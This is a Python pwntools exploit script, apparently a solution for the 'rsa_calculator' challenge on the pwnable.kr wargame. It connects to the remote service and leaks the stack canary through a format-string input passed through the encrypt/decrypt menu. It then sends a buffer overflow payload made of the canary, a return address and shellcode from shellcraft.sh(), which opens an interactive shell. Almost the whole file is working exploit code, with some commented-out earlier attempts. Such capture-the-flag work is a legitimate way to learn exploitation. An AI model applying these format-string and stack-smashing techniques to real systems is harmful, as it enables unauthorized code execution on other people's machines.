import socket, struct
import pwn

HOST = 'pwnable.kr'
PORT = 9012
rsa_binary = './rsa_calculator'

def strToHex(str):

	out = ''
	for i in str:
		out += '{:02x}'.format(ord(i))

	return out

def main():

	'''
	enc_payload = 'A' * 642
	dec_payload = '41' * 256
	'''
	pri_addr = 0x602960

	g_pbuf_addr = 0x602560
	pwn.context(arch='amd64', os='linux', log_level = 'debug')
	# p = pwn.process(rsa_binary)
	p = pwn.remote(HOST,PORT)
	# craft legitimate key
	p.sendline('1\n-1\n1\n1\n1') 	# craft key
	
	# leak canary
	p.sendline('2\n1024\n%205$016lx')
	p.recvuntil('(hex encoded) -\n')
	cipher = p.recvline()
	p.sendline('3\n1024\n'+cipher)
	p.recvuntil('- decrypted result -\n')
	stack_canary = int(p.recvline(),16)
	print("the canary is: @@@@@@{}".format(stack_canary))

	# load shellcode
	p.sendline('1\n3\n29312\n1\n58623')
	p.recvuntil('>')
	tmp = strToHex('a'*8+pwn.p64(stack_canary)+'a'*8+pwn.p64(pri_addr)+pwn.asm(pwn.shellcraft.sh())) #set retaddr=pri_addr
	p.sendline('3\n1024\n'+strToHex(tmp+'30'*(1024-len(tmp))))
	p.interactive()
	'''
	sc = pwn.asm(pwn.shellcraft.sh())
	p.sendline('2\n100\n'+sc)
	p.recvuntil('(hex encoded) -\n')
	cipher = p.recvline()
	'''
	# request encryption
	'''
	p.sendline('2') 		# encrypt
	p.sendline('266') 		# data length
	p.sendline(enc_payload) # filling user buffer
	

	# request decryption
	p.sendline('3') 		# decrypt	
	p.sendline('1024') 		# data length
	p.sendline(dec_payload) # filling user buffer
	'''



	data = p.recv()
	print (data)

	p.interactive()
	return


if __name__ == '__main__':
	main()